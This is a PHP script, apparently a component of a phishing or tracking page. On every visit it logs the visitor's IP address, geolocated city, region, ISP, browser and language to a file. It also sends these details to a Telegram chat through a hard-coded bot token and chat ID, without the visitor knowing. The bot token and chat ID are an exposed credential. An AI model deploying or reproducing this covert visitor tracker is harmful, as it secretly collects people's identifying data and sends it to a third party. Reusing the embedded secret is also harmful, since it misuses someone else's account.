<?php
$ip = $_SERVER['REMOTE_ADDR'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
$language = $_SERVER['HTTP_ACCEPT_LANGUAGE'];

// Get geolocation data
$geo = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);

$log = "[" . date("Y-m-d H:i:s") . "] IP: $ip | ";
$log .= "Country: {$geo['country']} | ";
$log .= "Region: {$geo['regionName']} | ";
$log .= "City: {$geo['city']} | ";
$log .= "ISP: {$geo['isp']} | ";
$log .= "Org: {$geo['org']} | ";
$log .= "Agent: $agent | ";
$log .= "Referer: $referer | ";
$log .= "Language: $language\n";

file_put_contents("logs/ips.txt", $log, FILE_APPEND);

// Telegram Notification for IP
$botToken = "7757124710:AAGqZ2XQTcps8EX3v6GCHYsbpHVJAR5LuIQ";
$chatId = "6730758751";
$message = urlencode("🌐 NEW VISITOR DETAILS 🌐\n\n"
    . "🖥️ IP: $ip\n"
    . "📍 Location: {$geo['city']}, {$geo['regionName']}, {$geo['country']}\n"
    . "🏢 ISP: {$geo['isp']}\n"
    . "🛠️ Org: {$geo['org']}\n"
    . "📱 Device: $agent\n"
    . "🔗 Referer: $referer\n"
    . "🗣️ Language: $language\n\n"
    . "🕒 Time: " . date("Y-m-d H:i:s"));
file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message");
?>
